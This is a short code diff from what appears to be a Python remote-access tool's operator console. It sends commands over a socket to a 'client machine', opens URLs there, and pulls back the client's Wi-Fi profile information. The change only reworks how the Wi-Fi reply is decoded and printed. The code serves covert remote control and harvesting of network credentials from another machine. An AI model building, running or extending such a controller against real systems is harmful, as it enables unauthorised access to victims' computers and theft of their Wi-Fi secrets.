@@ -104,6 +104,7 @@ def browse(cmd):
     print("[~] Opening [ {} ]...".format(url))
     controler.send(":browse {}".format(url).encode("UTF-8"))
     print("[*] Done \n")
+
 def control():
     try:
       cmd = str(input("[{}]:~# ".format(a[0])))
@@ -136,14 +137,18 @@ def control():
         check_con()
         control()
       elif cmd == ":wifi":
-        controler.send(b":wifi")
-        info = controler.recv().decode("UTF-8","ignore")
         print("[*] Geting Wifi profiles info...")
-        if info==":osnot:": print("[!] Sorry, i can't found wifi info of client machine!\n")
-        else:
-          print("[*] INFO:\n")
-          print(info + "\n")
-        control()
+        controler.send(b":wifi")
+        info = controler.recv()
+        try:
+          info = info.decode("UTF-8","ignore")
+        except  UnicodeEncodeError: info = info
+        finally:
+           if info==":osnot:": print("[!] Sorry, i can't found wifi info of client machine!\n")
+           else:
+             print("[*] INFO:\n")
+             print(info + "\n")
+             control()
       elif ":browse" in cmd:
         browse(cmd)
         control()
